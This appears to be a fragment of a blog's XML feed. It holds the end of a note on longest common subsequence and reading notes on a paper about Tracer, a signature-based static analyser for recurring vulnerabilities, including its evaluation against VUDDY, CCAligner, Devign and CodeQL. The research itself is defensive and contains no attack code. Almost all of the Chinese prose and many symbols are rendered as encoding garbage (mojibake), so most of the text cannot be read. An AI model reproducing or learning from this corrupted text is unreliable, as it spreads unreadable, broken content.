<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆLongest-Common-Subsequenceï¼‰"><a href="#æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆLongest-Common-Subsequenceï¼‰" class="headerlink" title="æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆLongest Common Subsequenceï¼‰"></a>æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆLongest Common Subsequenceï¼‰</h2><blockquote>
<p>ğ‘†1 &#x3D; ACCGGTCGAGTGCGCGGAAGCCGGCCGAA<br>ğ‘†2 &#x3D; GTCGTTCGGAATGCCGTTGCTCTGTAAA<br>ğ¿ğ¶ğ‘† &#x3D; GTCGTCGGAAGCCGGCCGAA</p>
</blockquote>
<p><del>æœªå®Œå¾…ç»­</del></p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>Algorithm</tag>
        <tag>Dynamic Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>è®ºæ–‡ç¬”è®°:Tracer:Signature-based Static Analysis for Detecting Recurring Vulnerabilities</title>
    <url>/2023/10/15/%E6%95%A3%E8%A8%98-10-14-23/</url>
    <content><![CDATA[<p>é˜…è¯»è®ºæ–‡ï¼šTracer: Signature-based Static Analysis for Detecting Recurring Vulnerabilities</p>
<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>ç”±äºå¼€å‘è€…å¾ˆå®¹æ˜“åœ¨åŒæ ·çš„åœ°æ–¹è¸©å‘ï¼ˆæ•°å­¦è¿ç®—ï¼Œåè®®ç­‰ï¼‰ï¼Œæˆ–è€…äººä»¬å¯¹å¤æ‚çš„ä½çº§è¯­æ„çš„è¯¯è§£ï¼ˆC è¯­è¨€ä¸­çš„æœªå®šä¹‰è¡Œä¸ºç­‰ï¼‰ï¼ŒåŠ ä¹‹ä»£ç é‡ç”¨ï¼Œè‡´ä½¿ç›¸ä¼¼çš„æ¼æ´é‡å¤å‡ºç°ã€‚</p>
<p>ä»£ç ç›¸ä¼¼æ€§æœ‰ä¸€äº›ç›¸å…³è®ºæ–‡ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p>
<ul>
<li>Yaniv David et al. Firmup: Precise static detection of common vulnerabilities in firmware.</li>
<li>Steven H. et al. Asm2vec: Boosting static representation robustness for binary clone search against code obfuscation and compiler optimization</li>
<li>Jiyong Jang et al. Redebug: Finding unpatched code clones in entire os distributions</li>
<li>Seulbae Kim et al. VUDDY: A scalable approach for vulnerable code clone discovery</li>
<li>Jingyue Li et al. Cbcd: Cloned buggy code detector. In 34th International Conference on Software Engineering (ICSE 2012). IEEE Computer Society, 2012</li>
<li>Damien Octeau et al. Combining static analysis with probabilistic models to enable market-scale android inter-component analysis</li>
<li>Nam H Pham et al. Detection of recurring software vulnerabilities</li>
<li>Yang Xiao et al. MVP: Detecting vulnerabilities using patch-enhanced vulnerability signatures</li>
</ul>
<p>ä½œè€…è®¤ä¸ºè¿™äº›å·¥å…·æ£€æµ‹æ˜¯åŸºäºè¯­æ³•åŒ¹é…çš„ï¼Œä¸èƒ½åº”å¯¹è¯­æ³•ç»“æ„å®Œå…¨ä¸ä¸€æ ·å´æœ‰ç€ç›¸ä¼¼çš„æ¼æ´ã€‚</p>
<p>ä½œè€…æå‡º5ä¸ªè¦ç´ ä»¥è¯„ä»·åˆ†æå™¨</p>
<ul>
<li>Accuracyï¼šæ˜¯å¦æ­£ç¡®æŠ¥å‘Šæ½œåœ¨çš„æ¼æ´ï¼Œä½è¯¯æŠ¥</li>
<li>Robustnessï¼šèƒ½å¦å‘ç°åŒæ ·æ¼æ´çš„å˜ç§</li>
<li>Generalityï¼šèƒ½å¦å‘ç°å¾ˆå¤šä¸åŒç§ç±»çš„æ¼æ´</li>
<li>Scalabilityï¼šèƒ½å¦é€‚ç”¨äºå¤§å‹ç¨‹åº</li>
<li>Usabilityï¼šæ˜¯å¦æœ‰ç›´è§‚å¯è§£é‡Šçš„æŠ¥å‘Š</li>
</ul>
<h1 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h1><p><img src="https://i.imgs.ovh/2023/10/15/rwjhs.png" alt="image-20231014190620861"></p>
<p>2009 å¹´ï¼Œåœ¨å›¾åƒå¤„ç†è½¯ä»¶ gimp ä¸­å‡ºç°äº†è¿™ä¹ˆä¸€ä¸ªæ•´æ•°æº¢å‡ºçš„æ¼æ´ï¼ˆå›¾1aï¼Œç¬¬12ï¼Œ13ï¼Œ14è¡Œï¼‰ã€‚ 8 å¹´åï¼Œç›¸ä¼¼çš„æ¼æ´åˆä¸€æ¬¡å‡ºç°åœ¨äº†å›¾åƒå¤„ç†è½¯ä»¶ sam2p ä¸­ï¼ˆå¦‚å›¾1bï¼‰ã€‚å› ä¸ºå¯¹ BMP å¤„ç†æœ‰ç€ç›¸ä¼¼çš„é€»è¾‘ï¼Œè¿™ä¸¤æ®µä»£ç ç‰‡æ®µæœ‰ç€ç›¸ä¼¼çš„é€»è¾‘ï¼Œç›¸ä¼¼çš„æ¼æ´<del>ï¼ˆäººç±»æ€»æ˜¯åœ¨åŒä¸€ä¸ªåœ°æ–¹é‡è¹ˆè¦†è¾™ï¼‰</del>ã€‚</p>
<p>ä¸ºäº†å‘ç°è¿™æ ·çš„æ¼æ´ï¼Œä½œè€…æå‡º Signature-based Static Analysisã€‚ç»å…¸çš„æ–¹æ³•æ˜¯ç›´æ¥æ¯”è¾ƒç¨‹åºçš„è¯­æ³•ï¼ˆæ¯”å¦‚å‡½æ•°æˆ–è€…ç¨‹åºå—ï¼‰ï¼Œå¯å‘å¼çš„æ–¹æ³•ï¼ˆVUDDY å’Œ MVPï¼‰é€‰æ‹©åŒ…å« patches çš„å‡½æ•°ä½œä¸ºç‰¹å¾ã€‚ç„¶è€Œè¿™äº›æ–¹æ³•éƒ½é€‚å¯¹ä»˜ä¸äº†è§„æ¨¡è¾ƒå¤§çš„ã€è¯­æ³•å·®åˆ«è¾ƒå¤§çš„å‡½æ•°ï¼ˆå¦‚å›¾1cï¼‰ï¼Œå°½ç®¡æ¼æ´çš„æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>ä½œè€…è¿˜æåˆ°ï¼ŒåŸºäºå…‹éš†çš„æ–¹æ³•ä¸èƒ½é«˜æ•ˆçš„é€šè¿‡å›¾1a çš„ signature æ£€å‡ºå›¾1b å›¾1c çš„æ¼æ´ï¼Œé€šç”¨çš„æ•´æ•°æº¢å‡ºæ£€æµ‹åˆæœ‰å¾ˆå¤šè¯¯æŠ¥ï¼Œé€šè¿‡ç‰¹å®šçš„åŒ¹é…å·¥ä½œé‡ä¹Ÿéå¸¸å¤§ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rw4UX.png" alt="image-20231014193732785"></p>
<p>å›¾2 æ˜¯ä½œè€…ä»‹ç»çš„å·¥å…·ï¼Œå¯ä»¥ç²¾ç¡®çš„ç”¨å›¾1a ä¸­çš„ signature æ£€æµ‹å›¾1b å’Œå›¾2c çš„æ¼æ´ã€‚</p>
<h2 id="Taint-Analysis"><a href="#Taint-Analysis" class="headerlink" title="Taint Analysis"></a>Taint Analysis</h2><p>ä½œè€…ç”¨ç®€å•çš„æ±¡ç‚¹å€¼æŠ½è±¡åŸŸ T &#x3D; {âŠ¥ğ‘¡ , âŠ¤ğ‘¡ } è¡¨ç¤ºæ˜¯å¦å¯èƒ½è¢«æ±¡æŸ“ï¼ŒâŠ¥ğ‘¡ è¡¨ç¤ºæ²¡è¢«æ±¡æŸ“ , âŠ¤ğ‘¡ è¡¨ç¤ºå¯èƒ½æ±¡ç‚¹æ•°æ®ã€‚æŠ½è±¡åŸŸ I &#x3D; {âŠ¥ğ‘œ, âŠ¤o} è¡¨ç¤ºæ˜¯å¦å¯èƒ½æº¢å‡º âŠ¤o å¯èƒ½æº¢å‡ºï¼ŒâŠ¥ğ‘œ æ²¡æº¢å‡ºã€‚åªæœ‰åŒæ—¶ âŠ¤ğ‘¡ å’Œ âŠ¤o æ—¶æ‰å¯èƒ½å­˜åœ¨æ¼æ´ã€‚</p>
<h2 id="Traces-on-Data-Dependency-Graphs"><a href="#Traces-on-Data-Dependency-Graphs" class="headerlink" title="Traces on Data Dependency Graphs."></a>Traces on Data Dependency Graphs.</h2><p>è¿™éƒ¨åˆ†æ˜¯å…³äºéœ€è¦æ¯”è¾ƒçš„ signatures ä¹Ÿå°±æ˜¯æ‰€è°“çš„ Traces ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä½œè€…è®¤ä¸ºä½¿ç”¨æ•°æ®æµä¾èµ–å›¾è€Œéæ§åˆ¶æµä¾èµ–å›¾èƒ½å¤Ÿé¿å…ä¸ç›¸å…³çš„è¡¨è¾¾å¼ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwd60.png" alt="image-20231014201014209"></p>
<p>ä½œè€…ä½¿ç”¨å¦‚å›¾3 æ‰€ç¤ºçš„ï¼Œä»æ•°æ®æµå›¾ä¸­æå–å‡ºçš„ source åˆ° sink point çš„ç—•è¿¹ã€‚è¿™æ ·çš„ç—•è¿¹ï¼ˆTraceï¼‰ä¼šè¢«ä½œä¸ºæ¼æ´çš„ signatureã€‚</p>
<p>ç„¶åä¼šå°½å¯èƒ½åœ°æå–å‡ºæ‰€æœ‰ source åˆ° sink point çš„ç—•è¿¹ã€‚<del>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œä»–ä»¬åªå±•å¼€ä¸€æ¬¡å¾ªç¯</del>ã€‚</p>
<h2 id="Feature-Representation"><a href="#Feature-Representation" class="headerlink" title="Feature Representation"></a>Feature Representation</h2><p>è¿™é‡Œè®²çš„ä¸»è¦æ˜¯å¯¹è¯­æ„è¯­æ³•çš„è¡¨è¾¾ã€‚æœ€ç»ˆ</p>
<p>ä½œè€…ä»¥å‘é‡çš„å½¢å¼æ¥è¡¨ç¤º Traceã€‚</p>
<ul>
<li>Low-Level featureï¼šå¦‚å›¾3a æ‰€å±•ç¤ºçš„è¢« &lt;&gt; åŒ…è£¹çš„å‘é‡ï¼Œåªè¡¨è¾¾ä½¿ç”¨äº†å‡ æ¬¡ primitive operator å’Œ APIsã€‚</li>
<li>High-Level featureï¼šéœ€è¦æ‰‹åŠ¨å®ç°çš„æ¯”å¦‚ <strong>IfSmallerThanConst</strong> ï¼Œè¡¨è¾¾ x &lt; const è¿™ç§è¯­æ„ã€‚å¦å¤–ï¼Œä½œè€…âœï¸æ‰‹åŠ¨å®ç°äº† 5 ç§è¯­æ„ã€‚</li>
</ul>
<p><del>å‡å¦‚ä»ç¨‹åºä¸­æ£€å‡ºäº†ç›®æ ‡çš„ç—•è¿¹ï¼Œä½†æ˜¯æ²¡æ£€å‡º signature ç—•è¿¹ï¼ˆè¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯æŒ‡ High-Level featureï¼‰ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ²¡æœ‰æ¼æ´ã€‚</del></p>
<h2 id="Similarity-Checking"><a href="#Similarity-Checking" class="headerlink" title="Similarity Checking"></a>Similarity Checking</h2><p>ä½œè€…ä½¿ç”¨ä½™å¼¦å‡½æ•°æ¥è¡¨ç¤ºç›¸ä¼¼åº¦ã€‚ä»¥å›¾3 ä¸ºä¾‹ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rw8eC.png" alt="image-20231014203914563"></p>
<p>å›¾3a å’Œå›¾3b æœ‰ç€ 0.96 çš„ç›¸ä¼¼åº¦ã€‚Tracer ç”±æ­¤æ£€æµ‹ç›¸ä¼¼åº¦æ¯”è¾ƒé«˜é‡å¤æ¼æ´ã€‚</p>
<hr>
<p>æ¥ç€ä½œè€…ç´§éšå…¶åæè¿°äº†ä¸Šè¿°æ•´ä¸ªè¿‡ç¨‹çš„å½¢å¼åŒ–æ–¹æ³•ï¼Œå¯¹ ALARMï¼ŒTAINED TRACEï¼ŒSCORE OF ALARM çš„å½¢å¼åŒ–å®šä¹‰ã€‚å¦‚æœæ„Ÿå…´è¶£å¯ä»¥çœ‹ä¸€ä¸‹åŸæ–‡ï¼Œè¿™é‡Œåªç®€æè¿°ä¸€ä¸‹ä¸€ä¸‹å½¢å¼åŒ–çš„ç®—æ³•å’Œå‡ ä¸ªå®šä¹‰ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwTMm.png" alt="image-20231014213942829"></p>
<p>ä»ç¨‹åºä¸­å–å‡º alarm çš„é›†åˆ ï¼ˆline1ï¼‰<br>æ ¹æ®ç¨‹åºæ„å»º DFG ï¼ˆline2ï¼‰<br>å¯¹ç¨‹åºçš„æ¯ä¸€ä¸ª alramï¼Œä»ä¸­æå–å‡º traces çš„é›†åˆ ï¼ˆline5ï¼‰<br>ç„¶åæŠŠè¿™äº› traces è¡¨è¾¾æˆ feature vectors ï¼ˆline6ï¼‰<br>ä¸ signature traces çš„ feature vectors å¯¹æ¯”ï¼Œå–ç›¸ä¼¼åº¦æœ€é«˜çš„ ï¼ˆline7ï¼‰</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwD9t.png" alt="image-20231014214138539"></p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwqSN.png" alt="image-20231014214156788"></p>
<p><img src="https://i.imgs.ovh/2023/10/15/rw9dR.png" alt="image-20231014214215482"></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œä½œè€…è¿˜å®šä¹‰äº†æŠ½è±¡å†…å­˜ï¼Œä»¥åŠä¸€ç³»åˆ—åœ¨æŠ½è±¡å†…å­˜ä¸Šçš„å½¢å¼åŒ–æ–¹æ³•ã€‚</p>
<p>ä½œè€…çš„åŠ¨æœºæ˜¯åœ¨çœ‹æ¼æ´æŠ¥å‘Šæ—¶å‘ç°å¼€å‘è€…é€šå¸¸æ ¹æ®ä¸€ç³»åˆ—æ“ä½œæ¥æè¿°ä¸€ä¸ªæ¼æ´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwNFp.png" alt="image-20231014221330858"></p>
<p>ä½œè€…æŠŠ low-level feature å’Œ high-level feature ä½œåˆ†ç¦»æ˜¯ä¸ºäº†æé«˜æ•ˆç‡å’Œç²¾åº¦ã€‚</p>
<p>åœ¨ Low-Level feature ä¸­ï¼Œç”±äºæ¯ä¸ª Trace åªæ˜¯ç”±ä¸€ç³»åˆ—æ“ä½œç»„æˆï¼Œä¸ºäº†æé«˜ç²¾åº¦</p>
<ul>
<li>åªæœ‰å½“åˆ†æå™¨æŠ¥å‘Š alarmï¼ˆsource and sink points ï¼‰æ‰ä¼šä»ç¨‹åºä¸­æå– traceï¼ˆé‚£ä¸€æ®µå‘é‡ï¼‰</li>
<li>ä½¿ç”¨æ•°æ®æµä¾èµ–</li>
</ul>
<p>åœ¨ High-Level feature ä¸­ï¼Œä½œè€…è®¾è®¡äº†å¦‚ä¸‹çš„ç‰¹æ€§ï¼Œè¿›ä¸€æ­¥æé«˜ç¨‹åºåˆ†æçš„ç²¾åº¦ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwahT.png" alt="image-20231014222451704"></p>
<p>ä»¥ EqualToPercentage ä¸ºä¾‹ï¼Œè¿™ä¸ªè®¾è®¡ä¹Ÿåœ¨ MVP ä¸­ä½¿ç”¨è¿‡ï¼Œåœ¨é€šå¸¸çš„æ¡ä»¶è¡¨è¾¾å¼ä¸­å¯ä»¥é¿å…æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é”™è¯¯ã€‚å°½ç®¡ä½œè€…è¯´åœ¨åªæœ‰ Low-Level feature çš„æƒ…å†µä¸‹ï¼ŒTrace çš„ç²¾åº¦å·²ç»å¾ˆé«˜äº†ï¼Œä½¿ç”¨äº† High-Level feature å¯ä»¥è®©ç²¾åº¦æ›´é«˜ã€‚</p>
<h1 id="Evaluate"><a href="#Evaluate" class="headerlink" title="Evaluate"></a>Evaluate</h1><h2 id="Experimental-Setup"><a href="#Experimental-Setup" class="headerlink" title="Experimental Setup"></a>Experimental Setup</h2><p><strong>Implementation</strong>ï¼šTracer åŸºäº Facebookâ€™s Infer analyzerï¼Œä½¿ç”¨æ±¡ç‚¹è¿½è¸ªèƒ½åˆ†ææ•´æ•°ä¸Šæº¢ï¼Œæ•´æ•°ä¸‹æº¢ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå‘½ä»¤æ³¨å…¥ï¼Œç¼“å†²åŒºæº¢å‡ºï¼Œå¦å¤–ç”¨ Pulse engine èƒ½åˆ†æUAFï¼Œdouble freeã€‚</p>
<p><strong>Signature Program</strong>ï¼šSignature Trace å–è‡ª ï¼ˆ1ï¼‰16 ä¸ªèƒ½è¢«æ±¡ç‚¹è¿½è¸ªå¤ç°çš„æ¼æ´ä»¥åŠä»¥å‰çš„ä¸€äº›å·¥ä½œã€‚ï¼ˆ2ï¼‰Juliet test suiteï¼šåŒ…å«äº†å¾ˆå¤šå¸¸è§æ¼æ´çš„å°ç¨‹åºï¼Œä½œè€…ä½¿å–äº† 5383 ä¸ª Tracer èƒ½åˆ†æçš„æ¼æ´ç¨‹åºã€‚ï¼ˆ3ï¼‰OWASP ä¸­å–äº† 5 ä¸ªå®‰å…¨ç¼–ç¨‹çš„ä¾‹å­ã€‚</p>
<p><strong>Benchmark</strong>ï¼šé€‰å–äº† 273 ä¸ª Debian packageï¼ˆC&#x2F;C++ï¼‰ ä½œä¸ºåŸºå‡†æµ‹è¯•ã€‚</p>
<p><strong>Baseline</strong>ï¼šä¸å…ˆè¿›çš„ä¸‰ç±»æ£€æµ‹å·¥å…·è¿›è¡Œå¯¹æ¯”ï¼ˆ1ï¼‰clone-based approachï¼ˆ2ï¼‰learning-based approachï¼ˆ3ï¼‰pattern-based static analyzerã€‚å…¶ä¸­é€‰æ‹©äº† VUDDYï¼ŒCCAlignerï¼ŒDevign å’Œ Githubâ€™s CodeQLã€‚</p>
<p><strong>Metrics</strong>ï¼šç”±äºä¸åŒåˆ†æå™¨ä¹‹é—´çš„è¡¨ç°ä¸å¤ªä¸€è‡´ï¼Œæ¯”å¦‚ CodeQL åªæŠ¥å‘Š sink pointã€‚ä¸ºäº†å…¬å¹³æ¯”è¾ƒåšäº†ä¸€äº›è€ƒè™‘ã€‚å±•ç¤º <strong>Root Cases</strong>ï¼Œä»¥åŠ <strong>Sink Point</strong>ï¼Œå¯¹äº Tracer å’Œ CodeQL æ¯”è¾ƒ true alarm å’Œ flase alarmï¼Œè€Œå…¶ä»–çš„ï¼ˆVUDDYï¼ŒCCAlignerï¼ŒDevignï¼‰åˆ™åªè®°å½•æŠ¥å‘Šçš„å‡½æ•°ã€‚</p>
<h2 id="RQ1ï¼šEffectiveness"><a href="#RQ1ï¼šEffectiveness" class="headerlink" title="RQ1ï¼šEffectiveness"></a>RQ1ï¼šEffectiveness</h2><p>Debian package ä¸­å¯¹äºå°šæœªè¢«å‘ç°çš„æ¼æ´ï¼Œä½œè€…é€‰å–äº†ç›¸ä¼¼åº¦å¤§äº 0.85 çš„ alarmï¼Œåœ¨ 0.85 ä»¥ä¸‹åˆéšæœºé€‰å–äº† 100 ä¸ªæŠ¥å‘Šè¿›è¡Œåˆ†æï¼Œæœ€ç»ˆäº§ç”Ÿäº† 424 ä»½æŠ¥å‘Šã€‚ä½œè€…å†™è¿™ç¯‡è®ºæ–‡æ—¶ï¼ŒTracer æ‰¾åˆ°äº† 112 ä¸ªæ–°æ¼æ´ï¼Œ30ä¸ªæ¼æ´å·²ç»è¢«ç¡®è®¤ï¼Œä¸”æ”¶è·äº† 6 ä¸ª CVEsã€‚è€Œåœ¨è¿™ 112 ä¸ªæ¼æ´ä¸­ï¼Œåªæœ‰ 10 ä¸ªèƒ½è¢« baseline tools ï¼ˆVUDDY å’Œ Devignï¼‰å‘ç°ã€‚<del>æ€äººè¯›å¿ƒ</del></p>
<p>è¡¨2 æ˜¯ Tracer å‘ç°çš„æ¼æ´çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3CPl.png" alt="image-20231014230916024"></p>
<p>false alarm ä¸ true alarm çš„æ›²çº¿ï¼Œå›¾ä¸­çš„ 0.95 0.90 0.85 è¡¨ç¤º Tracer çš„ç›¸ä¼¼åº¦ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwvUu.png" alt="image-20231014231312405"></p>
<h2 id="RQ2ï¼šComparison"><a href="#RQ2ï¼šComparison" class="headerlink" title="RQ2ï¼šComparison"></a>RQ2ï¼šComparison</h2><p>åŸºäºä»¥ä¸‹äº‹å®è¿›è¡Œæ¯”è¾ƒï¼Œå¯¹äºæ‰€æœ‰å·¥å…·ï¼ˆTracer85, VUDDY, CCAligner, and CodeQLï¼‰ä½œè€…éƒ½ä¼šæ‰‹åŠ¨åˆ†æ Tracer85 äº§ç”Ÿçš„ alarm æ•°é‡ï¼›æ”¶é›†æ‰€æœ‰å·¥å…·çš„çœŸå®æŠ¥è­¦ï¼ŒåŒ…æ‹¬ Tracer ä¸­ç›¸ä¼¼åº¦å°äº 0.85 éšæœºé‡‡æ ·çš„çœŸå®æŠ¥è­¦ã€‚</p>
<p>æœ€ç»ˆä½œè€…æ”¶é›†åˆ° 453 ä¸ªåŸºæœ¬äº‹å®ä¸å…¶ä»– baseline æ¯”è¾ƒã€‚å¦å¤–ï¼Œç”±äº Devign ä¸æä¾›åˆé€‚çš„æŠ¥å‘Šï¼Œä½œè€…åªåˆ¤æ–­å®ƒèƒ½å¦æ‰¾åˆ° 453 å…¶ä¸­çš„äº‹å®ã€‚</p>
<p>æ¯”è¾ƒçš„ç»“æœå¦‚è¡¨3 æ‰€ç¤ºã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3P6d.png" alt="image-20231014231329076"></p>
<p>ä¸ VUDDY å’Œ CCAligner ç›¸æ¯”ï¼ˆä¸ clone-based æ–¹æ³•ç›¸æ¯”ï¼‰ã€‚VUDDYO ä½¿ç”¨äº†åŸæ¥çš„æ•°æ®åº“ï¼ŒVUDDYS ä½¿ç”¨äº†ä¸ Tracer ç›¸åŒçš„æ•°æ®åº“ã€‚åœ¨ VUDDYO 12 ä¸ªæŠ¥å‘Šä¸­æœ‰ 7 ä¸ªè¯¯æŠ¥ï¼Œå…¶ä¸­åªæœ‰ 3 ä¸ªæ¼æ´ï¼Œ3 ä¸ªæ¼æ´ä¸­æœ‰ 1 ä¸ª Tracer æ²¡æœ‰å‘ç°ï¼ˆä½œè€…è§£é‡Šè¯´æ˜¯å› ä¸ºæ²¡æœ‰ç›¸å¯¹åº”çš„ signatureï¼‰ï¼Œè€Œå…¶ä»– 2 ä¸ªå¦‚å›¾12 æ‰€ç¤ºã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3VeK.png" alt="image-20231015102435111"></p>
<p>å¯¹äºè¿™ä¸¤ä¸ªç›¸ä¼¼çš„æ¼æ´ï¼ŒVUDDYO æ ¹æ® <code>LibRaw-demosaic-pack-GPL2, CVE-2017-6889</code> è€Œ Tracer æ ¹æ®ä¸å‘ç°å›¾1b ä¸­çš„æ¼æ´çš„ signature ç›¸ä¼¼åº¦è¾¾åˆ° 0.92ã€‚æ›´è¯´æ˜äº†å°½ç®¡å›¾12 ä¸å›¾1b ä¸­å±•çš„æ¼æ´æœ‰ç€å®Œå…¨ä¸åŒçš„è¯­æ³•ç»“æ„ï¼ŒTracer ä»èƒ½é«˜æ•ˆå‘ç°è¿™æ ·çš„æ¼æ´ã€‚</p>
<p>VUDDYS åªæœ‰ 10 ä¸ªè¯¯æŠ¥ã€‚ä»¥å›¾13 ä¸ºä¾‹ï¼Œä½œè€…è®¤ä¸ºåˆ° vfprintf çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å…¥éƒ½æ˜¯åˆæ³•çš„ã€‚<del>(å•è¿™ä¸ªå›¾åº”è¯¥çœ‹ä¸å‡ºæ¥)</del></p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3rMj.png" alt="image-20231015103952666"></p>
<p>CCAligner å‘ç°äº† 150 ä¸ªæŠ¥å‘Šä½†æ˜¯æ²¡æœ‰å‘ç°æ¼æ´ï¼ˆå› ä¸ºå®ƒæœ¬æ¥å°±ä¸æ˜¯æ‹¿æ¥æŒ–æ´çš„ï¼‰ï¼Œä½†æ˜¯å¯¹äºæ¼æ´æŒ–æ˜æ¥è¯´ï¼Œå®ƒä¹Ÿå­˜åœ¨å¤§é‡ä¸ VUDDYO ç›¸ä¼¼çš„çš„å‡ºç°åœ¨å›¾13b ä¸­çš„è¯¯æŠ¥ï¼ˆåˆæ³•è¾“å…¥ï¼‰ã€‚</p>
<p>ä¸ CodeQL ç›¸æ¯”ï¼ˆhuman-written bug patternsï¼‰ï¼ŒCodeQL æŠ¥å‘Šäº† 3488 ä¸ªï¼Œä½œè€…åˆ†æäº†å…¶ä¸­ 324 ä¸ªã€‚å…¶ä¸­ CodeQL æŠ¥å‘Šäº† 453 ä¸ªäº‹å®ï¼ˆå‰é¢æ”¶é›†çš„ï¼‰ä¸­çš„ 161 ä¸ªçœŸå®çš„æŠ¥å‘Šï¼Œè€Œ Tracer85 èƒ½å‘ç° 253 ä¸ªã€‚äº‹å®ä¸Š CodeQL ä¸ Tracer ç›¸æ¯”å¹¶ä¸èƒ½è¯´æ˜ Tracer åœ¨ signature åŒ¹é…ä¸Šæ›´åŠ å¥½ï¼Œå› ä¸º CodeQL å¹¶æ²¡æœ‰åŒ¹é… signature è€Œä¸”æœ‰ç€å®Œå…¨ä¸åŒçš„æ¶æ„ã€‚è¿™æ ·åªè¯´æ˜äº† Tracer ä¸å½“å‰æ¯”è¾ƒå¥½çš„é™æ€åˆ†æå™¨ç›¸æ¯”èƒ½ä¹Ÿèƒ½å‘ç°æ¯”è¾ƒé‡è¦çš„æ¼æ´ã€‚</p>
<p>å¯¹æ¯” Degignï¼ˆlearning-basedï¼‰ï¼Œä½œè€…ä¹Ÿä½¿ç”¨äº†ä¸¤ç§ä¸åŒçš„æ•°æ®é›†ï¼ˆä¸ VUDDY ç›¸ä¼¼ï¼‰ã€‚Devignğ‘‚ å‘ç°çš„ 10 ä¸ªæ¼æ´ä¸­æœ‰ 8 ä¸ªèƒ½è¢« Tracer å‘ç°ï¼Œè€Œ Devignğ‘† åŒæ ·ä¸€æ— æ‰€è·ã€‚</p>
<h2 id="RQ3ï¼šImpact-of-High-level-Features"><a href="#RQ3ï¼šImpact-of-High-level-Features" class="headerlink" title="RQ3ï¼šImpact of High-level Features"></a>RQ3ï¼šImpact of High-level Features</h2><p><img src="https://i.imgs.ovh/2023/10/15/r32uI.png" alt="image-20231015110816124"></p>
<p>ä»è¡¨4 ä¸­å¯ä»¥çœ‹å‡ºæœ‰æ—  High-Level Features å¯¹ç²¾åº¦çš„å½±å“ä¸å¤§ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›æå‡çš„ã€‚</p>
<h2 id="RQ4ï¼šScalability"><a href="#RQ4ï¼šScalability" class="headerlink" title="RQ4ï¼šScalability"></a>RQ4ï¼šScalability</h2><p><img src="https://i.imgs.ovh/2023/10/15/r3F8V.png" alt="image-20231015111432584"></p>
<p>ä½œè€…ä¸»è¦ä»ç¨‹åºçš„è§„æ¨¡å’Œè¿è¡Œçš„æ—¶é—´æ¥æè¿°ã€‚é™æ€åˆ†ææ¡†æ¶åˆ†æå¹³å‡åªè¦ 140.42â€ï¼Œç›¸ä¼¼åº¦è®¡ç®—å¹³å‡è¦ 2.71â€œï¼Œå¯¹äºå¤§éƒ¨åˆ†çš„åŒ…éƒ½åœ¨ 20â€˜ å†…å®Œæˆã€‚ä¸€ä¸ªèŠ±äº† 53â€˜ çš„ä¾‹å¤–ï¼Œä½œè€…è®¤ä¸ºæ˜¯å› ä¸ºå‡½æ•°æŒ‡é’ˆåˆ†æä¸ç²¾å‡†å¯¼è‡´åˆ†æäº†å¤ªå¤šå‡½æ•°ã€‚å¦ä¸€ä¸ªä¾‹å­æ˜¯å¯¹ gettext ä»–ä»¬åªèŠ±äº† 91â€œ å°±åˆ†æå®Œæˆäº† 982K è¡Œä»£ç ã€‚</p>
<h1 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h1><p>ä½œè€…å¼€å‘çš„ Signature-based Static Analysis åœ¨ 273 ä¸ª Debian ä¸Šå‘ç°äº† 112 ä¸ªå…ˆå‰æœªå‘ç°çš„æ¼æ´ï¼Œå…¶ä¸­æœ‰ 6 ä¸ªè¢«ç¡®è®¤ä¸º CVEã€‚</p>
<h1 id="ç¢ç¢å¿µ"><a href="#ç¢ç¢å¿µ" class="headerlink" title="ç¢ç¢å¿µ"></a>ç¢ç¢å¿µ</h1><p>è¿™æ˜¯æˆ‘è¯»çš„ç¬¬ä¸‰ç¯‡è®ºæ–‡ï¼Œæ–‡ç« çš„å†…å®¹ï¼Œå¯èƒ½æœ‰åœ°æ–¹æˆ‘çš„ç†è§£ä¸å¤ªå¯¹ï¼Œæˆ–è€…éƒ¨åˆ†å†…å®¹è¯¦ç•¥ä¸å¤Ÿå¾—å½“ï¼Œæ³è¯·ğŸ™‡è¯»è€…æ‰¹è¯„æŒ‡æ­£ã€‚</p>
